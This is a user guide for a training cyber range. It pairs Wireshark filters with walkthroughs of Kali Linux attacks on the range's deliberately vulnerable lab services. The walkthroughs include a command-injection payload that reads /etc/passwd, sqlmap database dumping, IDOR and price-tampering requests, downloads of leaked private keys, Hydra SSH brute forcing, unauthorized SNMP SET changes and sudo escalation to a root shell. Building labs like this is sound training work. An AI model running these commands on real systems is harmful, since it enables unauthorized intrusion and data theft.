# 📖 Dadiwoo Cyber Range Platform - Complete User, Wireshark & Kali Linux Penetration Testing Guide

Welcome to the **Dadiwoo Cyber Range Microservices Platform**. This guide covers system startup, Manager Dashboard navigation, Wireshark packet capture analysis, and Kali Linux penetration testing workflows.

🌐 **Live GitHub Pages Documentation Site**: [**https://kojoedem.github.io/cyber-range/**](https://kojoedem.github.io/cyber-range/)

---

## 📸 Manager Dashboard Visual Interface

The redesigned Manager Dashboard displays microservice cards with:
- **Header**: `🛡 Dadiwoo Central Cyber Range Control Plane`.
- **Search Bar**: Search by keyword or tag (`osint`, `wifi`, `sqli`, `idor`, `command-injection`, `financial`, `retail`, `bluetooth`).
- **Simultaneous Action Buttons**: Dedicated `▶ Start` and `⏹ Stop` controls on each card.
- **Settings Modal (`⚙️ Settings`)**: Popup for configuring Environment Purpose (`cybersecurity` vs `networking`), Local Domain, Port, and Difficulty Level.
- **Pagination**: 20 microservice cards per page.

![Manager Dashboard](docs/images/manager_dashboard.png)

---

## 🦈 1. Capturing Traffic with Wireshark

When testing or attacking any microservice, you can use **Wireshark** to capture HTTP/DNS packets and analyze network traffic in real time.

### How to Capture Microservice Traffic in Wireshark:
1. Open Wireshark on your host machine or Ubuntu VM:
   ```bash
   sudo wireshark
   ```
2. Select the interface bound to your range network (e.g. `lo` for localhost testing, or `eth0` / `docker0` / `vbr0` for GNS3/EVE-NG bridges).
3. Apply a Wireshark Display Filter to focus on microservice traffic:
   - **Filter HTTP Traffic on Lab Ports**:
     ```text
     http && (tcp.port == 8080 || tcp.port == 8081 || tcp.port == 8082 || tcp.port == 8083 || tcp.port == 8084 || tcp.port == 8085 || tcp.port == 8086 || tcp.port == 8087 || tcp.port == 8088)
     ```
   - **Filter SNMP & SSH Traffic**:
     ```text
     snmp || (udp.port == 16161 || tcp.port == 2222)
     ```
   - **Filter Mini DNS Traffic**:
     ```text
     dns && udp.port == 5353
     ```
4. **What You Will See in Wireshark**:
   - **Unencrypted HTTP Packets**: See POST form parameters (`card_number`, `pin`, `username`, `password`, `amount`, `attacker_mac`).
   - **Header Inspection**: Observe cookie session headers (`session_account=ACC-1001`) and HTTP 503 response codes when in General Networking Mode.
   - **DNS Queries**: Watch UDP queries resolving `atm.lab`, `bank.lab`, `isp.lab`, `school.lab`, `shop.lab`, `mobile.lab`, `wave.lab` to `<HOST_IP>`.

---

## 🐉 2. Attacking Microservices with Kali Linux Tools

You can attack the microservices from a Kali Linux VM or Kali container on your lab network.

### A. Reconnaissance & Port Scanning (Nmap)
Map all microservice ports on your Cyber Range host:
```bash
nmap -p 8080-8088,9000,5353,2222,16161 -sV <UBUNTU_VM_IP>
```

### B. OSINT & Passive Reconnaissance (Recon-ng, SpiderFoot, WhatsMyName)

#### Conceptual Overview
OSINT (Open Source Intelligence) tools like **Recon-ng**, **SpiderFoot**, and **WhatsMyName** are designed to perform passive and active gathering of publicly exposed information across internet registers, social networks, WHOIS databases, DNS servers, and public web endpoints.

#### Tool Behavior Against Local Microservices
- **WhatsMyName**: Searches ~600+ public websites (e.g., GitHub, Twitter, Reddit) via HTTP GET requests checking for active usernames (`STD-1001`, `admin`, `user1`). When pointed at a target's username, WhatsMyName queries public SaaS sites. To test username enumeration on local microservices (`school.lab`, `bank.lab`), custom modules or local HTTP scripts can be used against endpoint APIs like `/api/v1/users/` or `/lookup`.
- **Recon-ng**: Uses modular reconnaissance frameworks to query WHOIS, Shodan, Censys, and DNS resolvers. For local `.lab` targets inside GNS3/EVE-NG, configure Recon-ng's `recon/domains-hosts/brute_hosts` module using the local Mini DNS resolver (`<UBUNTU_VM_IP>:5353`).
- **SpiderFoot**: Scrapes domain names, IP addresses, subdomains, and web headers. Running SpiderFoot against local targets (`http://<UBUNTU_VM_IP>:8080-8085`) maps web server headers (`Uvicorn/FastAPI`), embedded contact emails, endpoint structures, and active ports.

### B. Bluetooth & Mobile Exfiltration - Mobile Lab (`:8085`)
Simulate Bluetooth pairing or exfiltrate phonebook contacts:
```bash
# Pair with default pin '0000'
curl -X POST http://<UBUNTU_VM_IP>:8085/bluetooth/pair \
     -d "attacker_mac=00:11:22:33:44:55&pin=0000"

# Unauthenticated contact exfiltration API
curl -s http://<UBUNTU_VM_IP>:8085/api/v1/bluetooth/exfiltrate
```

### C. SQL Injection Testing (sqlmap) - Online Banking (`:8081`)
Exploit search parameter SQLi on the Banking Portal:
```bash
sqlmap -u "http://<UBUNTU_VM_IP>:8081/?q=Allowance" --cookie="session_user=user1" --batch --dbs
```

### D. Parameter Injection / Command Execution - ISP Portal (`:8082`)
Test diagnostic tool command injection using `curl` or Burp Suite:
```bash
curl -X POST http://<UBUNTU_VM_IP>:8082/diagnostics \
     -d "host=127.0.0.1; id; cat /etc/passwd"
```

### E. IDOR & Logic Flaw Testing - ATM (`:8080`) & Shop (`:8084`)
Exploit Insecure Direct Object References:
```bash
# Fetch admin details and CTF flag from ATM API
curl -s http://<UBUNTU_VM_IP>:8080/api/v1/accounts/ACC-9000

# Client-side price tampering on E-Commerce Store
curl -X POST http://<UBUNTU_VM_IP>:8084/checkout \
     -d "product_id=1&price=0.01&coupon=DISCOUNT20"
```

### F. SSL/TLS Certificate Analysis & Private Key Decryption - Wave Chat (`:8086`)
Analyze certificates and exploit weak Let's Encrypt staging certificates:
```bash
# 1. Fetch active SSL/TLS certificate details via REST API
curl -s http://<UBUNTU_VM_IP>:8086/api/v1/certificate

# 2. Inspect certificate PEM file using OpenSSL in Kali
curl -s http://<UBUNTU_VM_IP>:8086/certificate/download/cert.pem -o cert.pem
openssl x509 -in cert.pem -text -noout

# 3. Download leaked private key in weak/beginner mode
curl -s http://<UBUNTU_VM_IP>:8086/certificate/download/key.pem -o key.pem

# 4. Import key.pem into Wireshark (Preferences -> Protocols -> TLS -> RSA Keys List) to decrypt PCAP traffic
```

### G. SNMP Network Enumeration & SET Exploitation - SNMP Lab (`:8087` / UDP `:16161`)
Enumerate SNMP community strings, walk MIB OID trees, and modify device states:
```bash
# 1. Enumerate unencrypted community strings (v1 / v2c)
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <UBUNTU_VM_IP> -p 16161
snmpcheck -t <UBUNTU_VM_IP> -p 16161 -c public

# 2. Walk MIB OID tree and retrieve CTF flags
snmpwalk -v2c -c public <UBUNTU_VM_IP>:16161 .1.3.6.1.4.1.9999

# 3. Perform unauthorized SET request to alter gateway status or credentials
snmpset -v2c -c private <UBUNTU_VM_IP>:16161 .1.3.6.1.4.1.9999.1.3.0 s "DOWN"

# 4. Authenticate via encrypted SNMPv3 USM with SHA & AES keys
snmpwalk -v3 -l authPriv -u admin_snmpv3 -a SHA -A AdminAuthPass123 -x AES -X AdminPrivPass123 <UBUNTU_VM_IP>:16161 .1
```

### H. SSH Brute Force, Leaked Key Auth & Sudo Escalation - SSH Lab (`:8088` / TCP `:2222`)
Perform real interactive SSH attacks and test defensive Fail2Ban rate limiting:
```bash
# 1. Direct SSH terminal login as standard user
ssh user@<UBUNTU_VM_IP> -p 2222  # Password: user123

# 2. Perform automated password brute forcing with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<UBUNTU_VM_IP>:2222

# 3. Download leaked RSA private key and log in passwordlessly
curl -s http://<UBUNTU_VM_IP>:8088/ssh/keys/download/id_rsa_user -o id_rsa_user.pem
chmod 600 id_rsa_user.pem
ssh -i id_rsa_user.pem user@<UBUNTU_VM_IP> -p 2222

# 4. Perform Sudo privilege escalation inside SSH shell
sudo -l
sudo /bin/bash
```

---

## 🚀 Microservices Quickstart Summary

```bash
chmod +x start_labs.sh
./start_labs.sh
```

- **🛡 Dadiwoo Manager Control Plane**: `http://<YOUR_HOST_IP>:9000`
- **🏧 Dadiwoo ATM Simulator**: `http://<YOUR_HOST_IP>:8080`
- **🏦 Dadiwoo Online Banking**: `http://<YOUR_HOST_IP>:8081`
- **🌐 Dadiwoo ISP Portal**: `http://<YOUR_HOST_IP>:8082`
- **🎓 Dadiwoo Student Portal**: `http://<YOUR_HOST_IP>:8083`
- **🛒 Dadiwoo E-Commerce Store**: `http://<YOUR_HOST_IP>:8084`
- **📱 Dadiwoo Smartphone Lab**: `http://<YOUR_HOST_IP>:8085`
- **🌊 Dadiwoo Wave Chat Lab**: `http://<YOUR_HOST_IP>:8086`
- **📡 Dadiwoo SNMP Network Lab**: `http://<YOUR_HOST_IP>:8087` (UDP `:16161`)
- **🔑 Dadiwoo SSH Hacking Lab**: `http://<YOUR_HOST_IP>:8088` (TCP `:2222`)
